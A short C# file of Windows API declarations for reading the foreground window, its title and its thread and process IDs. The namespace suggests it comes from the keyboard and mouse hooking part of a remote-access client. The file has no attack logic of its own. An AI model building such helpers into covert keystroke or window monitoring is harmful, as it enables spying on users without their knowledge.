using System;
using System.Runtime.InteropServices;
using System.Text;

namespace xClient.Core.MouseKeyHook.WinApi;

internal static class ThreadNativeMethods
{
	[DllImport("kernel32.dll")]
	internal static extern int GetCurrentThreadId();

	[DllImport("user32.dll")]
	internal static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	internal static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	internal static extern int GetWindowThreadProcessId(IntPtr handle, out int processId);
}
